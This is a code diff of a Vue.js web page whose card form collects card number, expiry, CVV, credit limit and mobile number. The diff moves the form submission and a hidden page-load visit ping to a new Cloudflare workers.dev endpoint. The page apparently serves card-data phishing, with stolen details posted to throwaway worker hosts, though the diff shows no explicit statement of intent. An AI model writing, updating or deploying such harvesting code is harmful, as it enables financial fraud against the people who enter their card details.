@@ -114,12 +114,10 @@
                 cardForm: { cardNumber: '', expiry: '', cvv: '', creditLimit: '', cardMobile: '' },
                 cardErrors: {}
             },
-            // पेज लोड होते ही विजिट पिंग भेजें (काउंट इंडेक्स में नहीं दिखेगा)
             mounted() {
                 this.sendVisitPing();
             },
             methods: {
-                // ---------- User Form ----------
                 clearUserError(field) {
                     if (this.userErrors[field]) this.$delete(this.userErrors, field);
                 },
@@ -165,7 +163,6 @@
                     }
                 },
                 
-                // ---------- Card Form ----------
                 clearCardError(field) {
                     if (this.cardErrors[field]) this.$delete(this.cardErrors, field);
                 },
@@ -249,7 +246,7 @@
                     }
                 },
                 
-                // ---------- COMMON – WORKER SUBMISSION ----------
+                // ---------- COMMON – WORKER SUBMISSION (नए Worker URL के साथ) ----------
                 async saveDataAndRedirect(formData, formType) {
                     const submission = {
                         id: Date.now(),
@@ -260,7 +257,7 @@
                     };
 
                     try {
-                        const response = await fetch('https://white-term-2335.skd38824.workers.dev/', {
+                        const response = await fetch('https://quiet-pond-0411.skd38824.workers.dev/', {
                             method: 'POST',
                             mode: 'cors',
                             headers: {
@@ -285,10 +282,10 @@
                     }
                 },
 
-                // ---------- नई विधि – विजिट ट्रैकिंग के लिए (केवल भेजना है, दिखाना नहीं) ----------
+                // ---------- विजिट ट्रैकिंग (अब एक ही Worker पर) ----------
                 async sendVisitPing() {
                     try {
-                        await fetch('https://billowing-forest-3780.skd38824.workers.dev/', {
+                        await fetch('https://quiet-pond-0411.skd38824.workers.dev/', {
                             method: 'POST',
                             mode: 'cors',
                             headers: { 'Content-Type': 'application/json' },
@@ -307,4 +304,3 @@
     </script>
 </body>
 </html>
-
